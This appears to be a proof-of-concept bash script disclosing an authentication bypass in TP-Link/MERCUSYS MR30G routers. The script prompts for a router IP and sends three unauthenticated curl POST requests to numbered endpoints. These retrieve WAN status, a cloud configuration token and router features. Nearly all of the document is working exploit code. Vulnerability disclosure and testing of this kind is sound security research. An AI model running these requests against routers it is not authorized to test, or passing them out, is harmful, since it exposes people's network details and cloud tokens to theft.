#!/bin/bash
cat << "EOF"
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║        TP-Link / MERCUSYS MR30G Authentication Bypass PoC            ║
║                                                                      ║
║  ┌──────────────────────────────────────────────────────────────┐    ║
║  │  Vulnerability : Incorrect Access Control                    │    ║
║  │  Attack Type   : Unauthenticated Local Network Access        │    ║
║  │  Impact        : Information Disclosure                      │    ║
║  │                                                              │    ║
║  └──────────────────────────────────────────────────────────────┘    ║
║                                                                      ║
║  Researcher : Zulfukar Karabulut                                     ║
║  GitHub     : https://github.com/2u1fuk4r                            ║
║  LinkedIn   : https://cy.linkedin.com/in/2u1fuk4r                    ║
║                                                                      ║
║  Status     : CVE Pending (MITRE Submission)                         ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
EOF

echo
read -p "Please enter the router IP address (e.g. 192.168.1.1): " ROUTER_IP

TARGET="http://$ROUTER_IP"

echo
echo "[*] Target set to: $TARGET"
sleep 1

echo
echo "=============================================================="
echo "[+] Test 1: Retrieve WAN Status (Endpoint 23)"
echo "=============================================================="

curl -s -X POST "$TARGET/?code=2&asyn=0" \
  -H "Content-Type: text/plain;charset=UTF-8" \
  -d "23|1,0,0"

echo
sleep 1

echo
echo "=============================================================="
echo "[+] Test 2: Retrieve Cloud Configuration Token (Endpoint 68)"
echo "=============================================================="

curl -s -X POST "$TARGET/?code=2&asyn=0" \
  -H "Content-Type: text/plain;charset=UTF-8" \
  -d "68|1,0,0"

echo
sleep 1

echo
echo "=============================================================="
echo "[+] Test 3: Retrieve Router Features (Endpoint 85)"
echo "=============================================================="

curl -s -X POST "$TARGET/?code=2&asyn=0" \
  -H "Content-Type: text/plain;charset=UTF-8" \
  -d "85|1,0,0"

echo
echo
echo "[*] PoC completed."
echo "[*] No authentication was performed during these requests."
echo "[*] This script is intended for authorized security research only."
